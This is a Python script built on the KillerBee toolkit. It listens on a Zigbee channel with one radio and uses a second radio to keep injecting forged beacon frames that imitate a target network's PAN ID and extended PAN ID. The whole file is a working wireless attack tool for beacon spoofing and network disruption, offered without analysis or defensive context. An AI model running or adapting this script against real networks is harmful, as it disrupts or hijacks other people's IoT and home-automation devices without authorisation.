#!/usr/bin/env python3
from __future__ import print_function

import signal
import sys
import argparse
import threading
from threading import Event
import logging
from time import sleep

from killerbee import *


def create_beacon(panid, coordinator, epanid):
    '''Raw creation of beacon packet.'''
    beacon = [
        "\x00",
        "\x80",
        "\xd8",
        str(struct.pack("H", panid)),
        "\x00\x00",
        "\xff\xcf",  
        "\x00",
        "\x00",
        "\x00\x22\x8c",
        str(struct.pack("L", epanid)),
        "\xff\xff\xff\x00"
    ]
    return ''.join(beacon)


def get_spanids():
    spanid = threading.spanid
    canidate = 0
    restart_threshold = 0
    while not continue_execution.isSet():
        try:
            recvpkt = listen.pnext()
        except:
            pass
        if recvpkt != None and recvpkt['validcrc']:
            restart_threshold = 0
            try:
                canidate = struct.unpack('H', recvpkt['bytes'][3:5])[0]
            except:
                print(recvpkt['bytes'][3:5])
                pass
            if canidate != None and canidate != spanid:
                print("Got beacon from {0}".format(hex(spanid)))
                spanid = canidate
                threading.spanid = spanid

        restart_threshold += 1
        if restart_threshold >= 15:
            listen.sniffer_off()
            listen.sniffer_on()
            restart_threshold = 0


def inject():
    while not continue_execution.isSet():
        sleep(args.sleep)
        sp = create_beacon(threading.spanid, args.coordinator, args.epanid) 
        try:
            kb.inject(sp)
        except:
            pass
    pass


if __name__ == '__main__':
    tohex = lambda s: int(s.replace(':', ''), 16)
    parser = argparse.ArgumentParser()
    parser.add_argument('-f', '--channel', '-c', action='store', dest='channel', required=True, type=int, default=11)
    parser.add_argument('-i', '--interface', action='store', dest='devstring')
    parser.add_argument('-l', '--listen', action='store', dest='listeninterface')
    parser.add_argument('-p', '--panid', action='store', required=True, type=tohex)
    parser.add_argument('-e', '--epanid', help="Extended PAN ID", action='store', required=True, type=tohex)
    parser.add_argument('-s', '--coordinator', action='store', required=True, type=tohex)
    parser.add_argument('-w','--sleep', action='store', type=float, required=False, default=0.01)
    #parser.add_argument('--numloops', action='store', default=1, type=int)
    args = parser.parse_args()

    kb = KillerBee(device=args.devstring)
    listen = KillerBee(device=args.listeninterface)

    kb.set_channel(args.channel)
    listen.set_channel(args.channel)
    listen.sniffer_on()

    coordinator = struct.pack('>H', args.coordinator)
    threading.spanid = args.panid

    continue_execution = Event()

    getem1 = threading.Thread(target=get_spanids)
    getem2 = threading.Thread(target=inject)

    getem1.daemon = True
    getem2.daemon = True

    getem2.start()
    getem1.start()

    while not continue_execution.isSet():
        try:
            getem2.join(timeout=1)
        except KeyboardInterrupt:
            continue_execution.set()
